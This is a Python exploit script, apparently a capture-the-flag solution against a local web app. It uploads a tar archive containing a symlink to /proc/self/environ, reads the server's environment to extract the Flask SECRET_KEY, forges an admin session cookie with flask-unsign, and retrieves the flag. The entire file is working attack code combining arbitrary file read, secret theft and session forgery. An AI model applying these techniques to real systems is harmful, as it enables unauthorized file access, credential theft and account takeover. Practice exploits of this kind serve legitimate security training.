from io import BytesIO
from PIL import Image
import numpy as np
import matplotlib.pyplot as plt
import matplotlib.image as mpimg
import os
import re
import requests
import shutil
import subprocess
import tarfile

url = "http://localhost:25021"

s = requests.Session()

# Create account
s.post(f"{url}/api/register", json={"username": "owo", "password": "uwu"})

# Login account
s.post(f"{url}/api/login", json={"username": "owo", "password": "uwu"})

if os.path.isdir("payload/"):
    shutil.rmtree("payload/")
os.mkdir("payload")
    
# Create symlink
os.symlink("/proc/self/environ", "payload/owo.txt")

# Create tar file
if os.path.isfile("payload.tar"):
    os.remove("payload.tar")
with tarfile.open(name="payload.tar", mode="w", dereference=False) as tar:
    tar.add("payload")

# Create our own captcha
captcha_id = "owo_foobar"
r = s.get(f"{url}/api/captcha?name={captcha_id}&length=1")
img_bytes = r.content
with open("captcha.png", "wb") as f:
    f.write(img_bytes)
captcha_solution = input("Please enter the captcha value: ")

# Upload tar file
with open("payload.tar", "rb") as f:
    r = s.post(f"{url}/api/upload", data={"captcha_id": captcha_id, "captcha_solution": captcha_solution}, files={"file": f})
    if r.status_code == 200:
        upload_id = r.text
        print(f"Upload successful with id {upload_id}.")
        r = s.get(f"{url}/uploads/{upload_id}/payload/owo.txt")
        env_vars = r.text
    else:
        print(r.status_code, r.text)
        
# Run "pipx install flask-unsign" first manually
secret_key = re.search(r"SECRET_KEY=([0-9A-F]{32})", env_vars).group(1)
ret = subprocess.run(["flask-unsign", "--sign", "--cookie", "{'user': 'OwO'}", "--secret", secret_key], capture_output=True).stdout.decode().strip()
print("Secret key:", ret)

# Replace our cookie
s.cookies.clear()
s.cookies.set("session", ret)
r = s.get(f"{url}/api/flag")
print(r.status_code, r.text)
